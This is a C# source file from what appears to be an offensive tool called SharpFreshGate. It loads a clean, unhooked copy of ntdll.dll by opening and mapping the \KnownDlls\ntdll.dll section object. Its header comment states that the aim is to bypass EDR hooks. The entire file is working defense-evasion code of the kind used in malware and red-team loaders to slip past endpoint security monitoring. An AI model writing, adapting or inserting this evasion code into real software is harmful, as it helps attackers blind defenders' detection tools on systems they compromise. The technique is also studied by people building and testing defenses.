/**
 * FreshNtdll.cs - Fresh NTDLL loader from KnownDlls
 * 
 * Loads a clean, unhooked copy of ntdll.dll from \KnownDlls\ section object
 * to bypass EDR hooks on the process's loaded ntdll.
 */

using System;
using System.Runtime.InteropServices;

namespace SharpFreshGate.Core
{
    /// <summary>
    /// FreshyCalls - Loads clean ntdll from KnownDlls section object
    /// </summary>
    public static class FreshNtdll
    {
        [DllImport("ntdll.dll")]
        private static extern int NtOpenSection(
            out IntPtr SectionHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes);

        [DllImport("ntdll.dll")]
        private static extern int NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            IntPtr SectionOffset,
            ref uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll")]
        private static extern int NtClose(IntPtr Handle);

        [DllImport("ntdll.dll")]
        private static extern void RtlInitUnicodeString(
            ref UNICODE_STRING DestinationString,
            [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        private static IntPtr _cleanNtdllBase = IntPtr.Zero;
        private static IntPtr _sectionHandle = IntPtr.Zero;

        /// <summary>
        /// Get the base address of the clean ntdll loaded from KnownDlls
        /// </summary>
        public static IntPtr GetCleanNtdllBase()
        {
            if (_cleanNtdllBase != IntPtr.Zero)
                return _cleanNtdllBase;

            if (!LoadCleanNtdll())
                return IntPtr.Zero;

            return _cleanNtdllBase;
        }

        /// <summary>
        /// Load clean ntdll from \KnownDlls\ntdll.dll section object
        /// </summary>
        private static bool LoadCleanNtdll()
        {
            Logger.Info("Loading fresh ntdll from \\KnownDlls\\...");

            try
            {
                // Initialize UNICODE_STRING for "\KnownDlls\ntdll.dll" (x64 only)
                UNICODE_STRING objectName = new UNICODE_STRING();
                RtlInitUnicodeString(ref objectName, @"\KnownDlls\ntdll.dll");

                // Initialize OBJECT_ATTRIBUTES
                OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES
                {
                    Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                    RootDirectory = IntPtr.Zero,
                    ObjectName = Marshal.AllocHGlobal(Marshal.SizeOf(objectName)),
                    Attributes = 0x40, // OBJ_CASE_INSENSITIVE
                    SecurityDescriptor = IntPtr.Zero,
                    SecurityQualityOfService = IntPtr.Zero
                };

                Marshal.StructureToPtr(objectName, objAttr.ObjectName, false);

                try
                {
                    // Open the section object
                    // SECTION_MAP_READ = 0x0004
                    const uint SECTION_MAP_READ = 0x0004;
                    int status = NtOpenSection(out _sectionHandle, SECTION_MAP_READ, ref objAttr);

                    if (status != 0)
                    {
                        Logger.Error($"NtOpenSection failed. NTSTATUS: 0x{status:X8}");
                        return false;
                    }

                    Logger.Info($"Opened \\KnownDlls\\ntdll.dll section. Handle: 0x{_sectionHandle.ToString("X")}");

                    // Map the section into our process
                    IntPtr baseAddress = IntPtr.Zero;
                    uint viewSize = 0;

                    // ViewShare = 2, PAGE_READONLY = 0x02
                    status = NtMapViewOfSection(
                        _sectionHandle,
                        new IntPtr(-1), // Current process
                        ref baseAddress,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        ref viewSize,
                        2, // ViewShare
                        0,
                        0x02); // PAGE_READONLY

                    if (status != 0 && status != 0x40000003) // Allow STATUS_IMAGE_NOT_AT_BASE
                    {
                        Logger.Error($"NtMapViewOfSection failed. NTSTATUS: 0x{status:X8}");
                        NtClose(_sectionHandle);
                        return false;
                    }

                    _cleanNtdllBase = baseAddress;
                    Logger.Success($"Mapped clean ntdll at 0x{_cleanNtdllBase.ToString("X")} (Size: {viewSize} bytes)");
                    return true;
                }
                finally
                {
                    Marshal.FreeHGlobal(objAttr.ObjectName);
                }
            }
            catch (Exception ex)
            {
                Logger.Error($"Failed to load clean ntdll: {ex.Message}");
                return false;
            }
        }

        /// <summary>
        /// Cleanup - unmap the clean ntdll (optional, usually not needed)
        /// </summary>
        public static void Cleanup()
        {
            if (_sectionHandle != IntPtr.Zero)
            {
                NtClose(_sectionHandle);
                _sectionHandle = IntPtr.Zero;
            }
            // Note: We don't unmap the view as it may still be in use
            // The OS will clean it up when the process exits
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct OBJECT_ATTRIBUTES
    {
        public int Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }
}
